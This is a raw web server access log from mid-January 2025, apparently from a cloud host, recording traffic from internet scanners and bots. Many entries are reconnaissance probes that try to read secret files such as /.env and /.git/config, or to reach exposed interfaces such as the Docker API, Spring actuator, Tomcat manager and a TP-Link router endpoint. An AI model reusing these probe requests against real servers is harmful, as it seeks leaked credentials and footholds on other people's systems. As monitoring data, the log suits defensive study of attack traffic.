78.153.140.149 - - [16/Jan/2025:09:18:48 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
179.43.191.146 - - [16/Jan/2025:09:22:54 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
206.168.34.214 - - [16/Jan/2025:09:53:51 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.214 - - [16/Jan/2025:09:54:03 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.214 - - [16/Jan/2025:09:54:06 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.214 - - [16/Jan/2025:09:54:07 +0000] "GET / HTTP/1.1" 200 966 "http://34.176.179.0/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.214 - - [16/Jan/2025:09:54:08 +0000] "PRI * HTTP/2.0" 400 533 "-" "-"
125.133.45.222 - - [16/Jan/2025:10:08:32 +0000] "GET / HTTP/1.0" 400 533 "-" "curl/7.88.1"
92.255.57.11 - - [16/Jan/2025:10:23:11 +0000] "\x03" 400 533 "-" "-"
206.189.152.11 - - [16/Jan/2025:10:37:44 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
206.189.152.11 - - [16/Jan/2025:10:37:49 +0000] "\x16\x03\x01\x01\v\x01" 400 533 "-" "-"
78.153.140.149 - - [16/Jan/2025:10:41:30 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [16/Jan/2025:10:41:33 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
95.248.87.97 - - [16/Jan/2025:10:51:34 +0000] "GET / HTTP/1.0" 400 533 "-" "curl/7.88.1"
168.253.90.155 - - [16/Jan/2025:11:32:34 +0000] "GET /admin/assets/js/views/login.js HTTP/1.0" 302 350 "-" "xfa1"
78.153.140.149 - - [16/Jan/2025:11:33:38 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [16/Jan/2025:11:33:39 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
34.140.130.14 - - [16/Jan/2025:11:56:17 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
110.41.184.245 - - [16/Jan/2025:12:08:17 +0000] "GET /stalker_portal/c/xpcom.common.js HTTP/1.1\n" 400 533 "-" "-"
185.196.220.253 - - [16/Jan/2025:12:21:47 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
92.114.59.139 - - [16/Jan/2025:12:28:18 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
92.114.59.139 - - [16/Jan/2025:12:28:26 +0000] "GET /index.action HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
92.114.59.139 - - [16/Jan/2025:12:28:27 +0000] "GET / HTTP/1.1" 200 944 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
92.114.59.139 - - [16/Jan/2025:12:28:39 +0000] "GET /login.action HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
92.114.59.139 - - [16/Jan/2025:12:28:39 +0000] "GET / HTTP/1.1" 200 944 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
92.114.59.139 - - [16/Jan/2025:12:28:43 +0000] "GET /index.do HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
92.114.59.139 - - [16/Jan/2025:12:28:44 +0000] "GET / HTTP/1.1" 200 944 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
92.114.59.139 - - [16/Jan/2025:12:28:47 +0000] "GET /index.jsp HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
92.114.59.139 - - [16/Jan/2025:12:28:48 +0000] "GET / HTTP/1.1" 200 944 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
92.114.59.139 - - [16/Jan/2025:12:28:56 +0000] "POST / HTTP/1.1" 200 1003 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:29:10 +0000] "POST /index.action HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:29:11 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:29:18 +0000] "POST /login.action HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:29:20 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:29:28 +0000] "POST /index.do HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:29:30 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:29:39 +0000] "POST /index.jsp HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:29:40 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:29:49 +0000] "POST /login.do HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:29:50 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:29:59 +0000] "POST /login.jsp HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:30:01 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:30:09 +0000] "POST /main.jsp HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:30:10 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:30:19 +0000] "POST /default.jsp HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:30:20 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:30:29 +0000] "POST /register.jsp HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:30:31 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:30:41 +0000] "POST /login/login.jsp HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:30:42 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:30:52 +0000] "POST /login/indexAction.action HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:30:54 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:31:02 +0000] "POST /indexAction.action HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:31:04 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:31:12 +0000] "POST / HTTP/1.1" 200 1003 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:31:21 +0000] "POST /index.action HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:31:23 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:31:32 +0000] "POST /login.action HTTP/1.1" 302 387 "-" "python-requests/2.27.1"
92.114.59.139 - - [16/Jan/2025:12:31:33 +0000] "GET / HTTP/1.1" 200 944 "-" "python-requests/2.27.1"
64.62.197.37 - - [16/Jan/2025:12:31:52 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0"
66.169.6.245 - - [16/Jan/2025:12:32:42 +0000] "GET / HTTP/1.0" 400 533 "-" "curl/7.88.1"
64.62.197.39 - - [16/Jan/2025:12:33:48 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0"
64.62.197.32 - - [16/Jan/2025:12:34:25 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0"
5.181.190.248 - - [16/Jan/2025:13:02:54 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [16/Jan/2025:13:02:54 +0000] "GET / HTTP/1.1" 200 1742 "http://34.176.179.0:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
37.72.179.186 - - [16/Jan/2025:13:21:23 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
139.59.101.104 - - [16/Jan/2025:13:28:41 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
64.23.201.216 - - [16/Jan/2025:13:57:50 +0000] "GET /admin/assets/js/views/login.js HTTP/1.0" 302 350 "-" "xfa1"
78.153.140.149 - - [16/Jan/2025:14:07:10 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [16/Jan/2025:14:07:10 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
80.82.77.202 - - [16/Jan/2025:14:40:51 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre"
78.153.140.149 - - [16/Jan/2025:15:09:28 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [16/Jan/2025:15:09:28 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
46.19.138.234 - - [16/Jan/2025:15:14:38 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.148.10.242 - - [16/Jan/2025:15:23:53 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
5.181.190.248 - - [16/Jan/2025:15:34:23 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [16/Jan/2025:15:34:23 +0000] "GET / HTTP/1.1" 200 1742 "http://34.176.179.0:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
139.162.71.210 - - [16/Jan/2025:15:42:21 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
80.82.77.202 - - [16/Jan/2025:15:49:29 +0000] "\x16\x03\x02\x01o\x01" 400 533 "-" "-"
139.59.101.104 - - [16/Jan/2025:16:08:10 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
52.228.154.166 - - [16/Jan/2025:16:08:12 +0000] "GET /manager/text/list HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
78.153.140.149 - - [16/Jan/2025:16:11:55 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [16/Jan/2025:16:11:56 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
179.43.191.146 - - [16/Jan/2025:16:28:55 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
4.255.100.154 - - [16/Jan/2025:16:37:58 +0000] "GET /hudson HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
185.247.137.3 - - [16/Jan/2025:16:41:30 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
93.208.223.148 - - [16/Jan/2025:16:41:47 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
195.178.110.224 - - [16/Jan/2025:16:57:51 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
185.196.220.253 - - [16/Jan/2025:16:58:16 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
52.249.38.140 - - [16/Jan/2025:17:24:22 +0000] "MGLNDD_34.176.179.0_80\n" 400 533 "-" "-"
95.214.55.226 - - [16/Jan/2025:17:45:17 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
161.35.200.24 - - [16/Jan/2025:18:10:38 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible)"
161.35.200.24 - - [16/Jan/2025:18:10:39 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "http://34.176.179.0/" "Mozilla/5.0 (compatible)"
195.3.223.40 - - [16/Jan/2025:18:35:00 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.149 - - [16/Jan/2025:18:37:39 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [16/Jan/2025:18:37:39 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [16/Jan/2025:18:46:40 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [16/Jan/2025:18:46:41 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
18.216.4.246 - - [16/Jan/2025:19:03:26 +0000] "\x16\x03\x01" 400 533 "-" "-"
18.216.4.246 - - [16/Jan/2025:19:03:39 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
49.213.250.102 - - [16/Jan/2025:19:27:56 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
64.23.201.216 - - [16/Jan/2025:19:30:03 +0000] "GET /admin/assets/js/views/login.js HTTP/1.0" 302 350 "-" "xfa1"
45.148.10.242 - - [16/Jan/2025:19:34:24 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.161.83.117 - - [16/Jan/2025:19:48:33 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.79.172.21 - - [16/Jan/2025:19:48:42 +0000] "\x16\x03\x01" 400 533 "-" "-"
4.151.229.99 - - [16/Jan/2025:20:23:14 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
46.19.138.234 - - [16/Jan/2025:20:54:46 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.149 - - [16/Jan/2025:21:03:53 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [16/Jan/2025:21:03:53 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.196.220.253 - - [16/Jan/2025:21:20:34 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
78.153.140.149 - - [16/Jan/2025:21:31:52 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [16/Jan/2025:21:31:52 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
179.43.191.146 - - [16/Jan/2025:21:42:34 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
192.155.90.118 - - [16/Jan/2025:21:46:23 +0000] "\x16\x03\x01" 400 533 "-" "-"
205.210.31.233 - - [16/Jan/2025:21:48:13 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.242.226.10 - - [16/Jan/2025:21:55:32 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
108.189.157.61 - - [16/Jan/2025:22:22:06 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
46.19.138.234 - - [16/Jan/2025:22:31:09 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
47.135.82.3 - - [16/Jan/2025:22:47:50 +0000] "GET / HTTP/1.0" 400 533 "-" "curl/7.88.1"
198.235.24.129 - - [16/Jan/2025:23:12:11 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
87.120.115.119 - - [16/Jan/2025:23:20:39 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
95.214.55.226 - - [16/Jan/2025:23:33:40 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
198.235.24.16 - - [15/Jan/2025:00:02:22 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
95.214.55.226 - - [15/Jan/2025:00:18:43 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
35.216.172.13 - - [15/Jan/2025:00:20:14 +0000] "\x16\x03\x01" 400 533 "-" "-"
35.216.172.13 - - [15/Jan/2025:00:20:14 +0000] "GET / HTTP/1.1" 400 533 "-" "-"
35.216.172.13 - - [15/Jan/2025:00:20:15 +0000] "GET / HTTP/1.1" 200 1761 "-" "abuse.xmco.fr"
35.216.172.13 - - [15/Jan/2025:00:20:15 +0000] "GET /telescope/requests HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr"
35.216.172.13 - - [15/Jan/2025:00:20:15 +0000] "GET /info.php HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr"
35.216.172.13 - - [15/Jan/2025:00:20:16 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr"
35.216.172.13 - - [15/Jan/2025:00:20:16 +0000] "GET /server-status HTTP/1.1" 403 457 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr"
35.216.172.13 - - [15/Jan/2025:00:20:17 +0000] "GET /config.json HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr"
35.216.172.13 - - [15/Jan/2025:00:20:17 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr"
64.23.201.216 - - [15/Jan/2025:00:40:15 +0000] "GET /admin/assets/js/views/login.js HTTP/1.0" 302 350 "-" "xfa1"
201.20.85.123 - - [15/Jan/2025:00:52:54 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
201.20.85.123 - - [15/Jan/2025:00:52:54 +0000] "GET /containers/json HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
201.20.85.123 - - [15/Jan/2025:00:52:54 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
201.20.85.123 - - [15/Jan/2025:00:52:55 +0000] "GET /.env.bak HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
201.20.85.123 - - [15/Jan/2025:00:52:56 +0000] "GET /version HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
201.20.85.123 - - [15/Jan/2025:00:52:56 +0000] "\x16\x03\x01" 400 533 "-" "-"
201.20.85.123 - - [15/Jan/2025:00:52:56 +0000] "\x16\x03\x01" 400 533 "-" "-"
201.20.85.123 - - [15/Jan/2025:00:52:56 +0000] "\x16\x03\x01" 400 533 "-" "-"
201.20.85.123 - - [15/Jan/2025:00:52:56 +0000] "\x16\x03\x01" 400 533 "-" "-"
206.168.34.199 - - [15/Jan/2025:00:55:06 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.199 - - [15/Jan/2025:00:55:18 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.199 - - [15/Jan/2025:00:55:20 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.199 - - [15/Jan/2025:00:55:22 +0000] "GET / HTTP/1.1" 200 966 "http://34.176.179.0/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.199 - - [15/Jan/2025:00:55:23 +0000] "PRI * HTTP/2.0" 400 533 "-" "-"
46.19.138.234 - - [15/Jan/2025:01:34:23 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.255.57.58 - - [15/Jan/2025:02:03:47 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
179.43.191.146 - - [15/Jan/2025:02:22:32 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.255.57.58 - - [15/Jan/2025:02:54:16 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [15/Jan/2025:02:54:18 +0000] "GET / HTTP/1.1" 200 966 "http://34.176.179.0:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [15/Jan/2025:03:35:28 +0000] "\x16\x03\x01\x05\xa8\x01" 400 533 "-" "-"
51.254.59.113 - - [15/Jan/2025:03:50:44 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
